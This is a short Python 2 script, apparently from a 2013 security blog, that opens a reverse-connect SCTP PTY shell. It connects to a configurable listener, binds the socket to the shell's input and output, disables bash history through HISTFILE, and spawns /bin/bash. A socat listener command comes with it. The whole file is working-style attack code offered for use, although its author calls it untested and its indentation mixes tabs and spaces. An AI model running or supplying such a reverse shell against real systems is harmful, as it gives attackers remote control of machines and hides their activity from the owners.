#!/usr/bin/python2
"""
Reverse Connect SCTP PTY Shell - testing version
infodox - insecurety.net (2013)

Please note this may not work and I need to clean it up.
It is also COMPLETELY untested as right now I do not have a
linux box to test it on. I will do so later today.

For an excellent listener use the following socat command:
socat file:`tty`,echo=0,raw sctp-listen:PORT
"""
import os
import pty
import socket
from sctp import *

lhost = "127.0.0.1" # XXX: CHANGEME
lport = 31337 # XXX: CHANGEME

def main():
    s = sctpsocket_tcp(socket.AF_INET)
	s.connect((lhost, lport))
	os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
	
if __name__ == "__main__":
    main()